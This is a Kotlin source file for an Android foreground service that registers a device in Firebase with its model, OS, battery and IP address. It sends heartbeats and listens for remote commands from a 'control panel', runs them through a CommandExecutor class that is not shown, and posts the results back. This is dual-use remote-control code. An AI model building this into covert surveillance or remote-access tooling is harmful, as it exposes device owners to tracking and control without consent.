package com.abuzahra.app.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.firebase.database.*
import com.abuzahra.app.handler.CommandExecutor
import com.abuzahra.app.utils.Constants
import com.abuzahra.app.utils.DeviceInfo
import com.abuzahra.app.utils.NotificationHelper
import kotlinx.coroutines.*
import kotlin.coroutines.CoroutineContext
import java.util.Random

class FirebaseListenerService : Service(), CoroutineScope {

    private val TAG = "FirebaseListener"
    private val job = Job()
    override val coroutineContext: CoroutineContext = Dispatchers.IO + job

    private lateinit var database: DatabaseReference
    private var commandListener: ValueEventListener? = null
    private var heartbeatJob: Job? = null

    private val deviceId: String by lazy { DeviceInfo.getDeviceId(this) }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "onCreate - Device: $deviceId")

        startForeground(
            Constants.NOTIFICATION_ID,
            NotificationHelper.buildServiceNotification(this)
        )

        initFirebase()
        sendDeviceRegistration()
        generateLinkCode()
        startHeartbeat()
        listenForCommands()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun initFirebase() {
        database = FirebaseDatabase.getInstance().reference
        Log.d(TAG, "Firebase initialized")
    }

    private fun sendDeviceRegistration() {
        launch {
            try {
                val deviceInfo = DeviceInfo.getFullDeviceInfo(this@FirebaseListenerService)
                val deviceData = mapOf(
                    "id" to deviceId,
                    "name" to "${DeviceInfo.getDeviceBrand()} ${DeviceInfo.getDeviceModel()}",
                    "model" to DeviceInfo.getDeviceModel(),
                    "brand" to DeviceInfo.getDeviceBrand(),
                    "os" to DeviceInfo.getDeviceOS(),
                    "battery" to getBatteryLevel(),
                    "network" to DeviceInfo.getIPAddress(),
                    "location" to "",
                    "ip" to DeviceInfo.getIPAddress(),
                    "active" to true,
                    "lastSeen" to ServerValue.TIMESTAMP,
                    "info" to deviceInfo
                )
                database.child("devices").child(deviceId).setValue(deviceData)
                Log.d(TAG, "Device registered: $deviceId")
            } catch (e: Exception) {
                Log.e(TAG, "Registration failed", e)
            }
        }
    }

    /**
     * Generate a 6-character link code and save it to Firebase.
     * The control panel app reads this code to link the device.
     */
    private fun generateLinkCode() {
        launch {
            try {
                val code = generateCode()
                Log.d(TAG, "Link code: $code")

                // Save to Firebase under /linkCodes/{code}
                val linkData = mapOf(
                    "deviceId" to deviceId,
                    "used" to false,
                    "createdAt" to ServerValue.TIMESTAMP,
                    "deviceName" to "${DeviceInfo.getDeviceBrand()} ${DeviceInfo.getDeviceModel()}"
                )
                database.child("linkCodes").child(code).setValue(linkData)
                    .addOnSuccessListener {
                        Log.d(TAG, "Link code saved: $code")
                        // Update notification with code
                        NotificationHelper.updateNotificationWithCode(this@FirebaseListenerService, code)
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Failed to save link code", e)
                    }
            } catch (e: Exception) {
                Log.e(TAG, "generateLinkCode error", e)
            }
        }
    }

    private fun generateCode(): String {
        val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        val random = Random()
        val sb = StringBuilder()
        for (i in 0 until 6) {
            sb.append(chars[random.nextInt(chars.length)])
        }
        return sb.toString()
    }

    private fun startHeartbeat() {
        heartbeatJob = launch {
            while (isActive) {
                try {
                    database.child("devices").child(deviceId).apply {
                        child("heartbeat").setValue(mapOf(
                            "timestamp" to System.currentTimeMillis(),
                            "battery" to getBatteryLevel(),
                            "network" to DeviceInfo.getIPAddress()
                        ))
                        child("lastSeen").setValue(ServerValue.TIMESTAMP)
                        child("battery").setValue(getBatteryLevel())
                        child("active").setValue(true)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat failed", e)
                }
                delay(Constants.HEARTBEAT_INTERVAL)
            }
        }
    }

    private fun listenForCommands() {
        commandListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) return

                launch {
                    try {
                        val command = snapshot.getValue(Map::class.java) as? Map<*, *>
                        if (command != null) {
                            val cmdName = command["command"] as? String ?: return@launch
                            val params = command["params"] as? Map<*, *> ?: emptyMap<String, Any>()
                            val cmdTimestamp = command["timestamp"] as? Long ?: System.currentTimeMillis()

                            Log.d(TAG, "Command received: $cmdName")

                            // Remove command after reading
                            database.child("devices").child(deviceId).child("command")
                                .removeValue()

                            // Execute
                            val executor = CommandExecutor(this@FirebaseListenerService)
                            val result = executor.execute(cmdName, params)

                            // Convert result to string for the control panel
                            val resultStr = when (result) {
                                is Map<*, *> -> {
                                    val sb = StringBuilder()
                                    for ((k, v) in result) {
                                        sb.append("$k: $v\n")
                                    }
                                    sb.toString().trim()
                                }
                                is String -> result
                                is List<*> -> result.joinToString("\n")
                                else -> result.toString()
                            }

                            // Send result back
                            val resultData = mapOf(
                                "command" to cmdName,
                                "status" to "completed",
                                "result" to resultStr,
                                "timestamp" to System.currentTimeMillis()
                            )
                            database.child("devices").child(deviceId).child("result")
                                .setValue(resultData)

                            Log.d(TAG, "Result sent for: $cmdName")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Command execution error", e)
                        database.child("devices").child(deviceId).child("result")
                            .setValue(mapOf(
                                "status" to "error",
                                "result" to (e.message ?: "Unknown error"),
                                "timestamp" to System.currentTimeMillis()
                            ))
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Listener cancelled", error.toException())
                launch {
                    delay(5000)
                    listenForCommands()
                }
            }
        }

        database.child("devices").child(deviceId).child("command")
            .addValueEventListener(commandListener as ValueEventListener)
        Log.d(TAG, "Listening: devices/$deviceId/command")
    }

    private fun getBatteryLevel(): Int {
        return try {
            val filter = android.content.Intent.ACTION_BATTERY_CHANGED
            val batteryStatus = registerReceiver(null, android.content.IntentFilter(filter))
            val level = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: 0
            val scale = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
            (level * 100 / scale)
        } catch (e: Exception) { 0 }
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        heartbeatJob?.cancel()
        commandListener?.let {
            database.child("devices").child(deviceId).child("command").removeEventListener(it)
        }
        try {
            database.child("devices").child(deviceId).child("active").setValue(false)
        } catch (_: Exception) {}
        Log.d(TAG, "Service destroyed")
    }
}
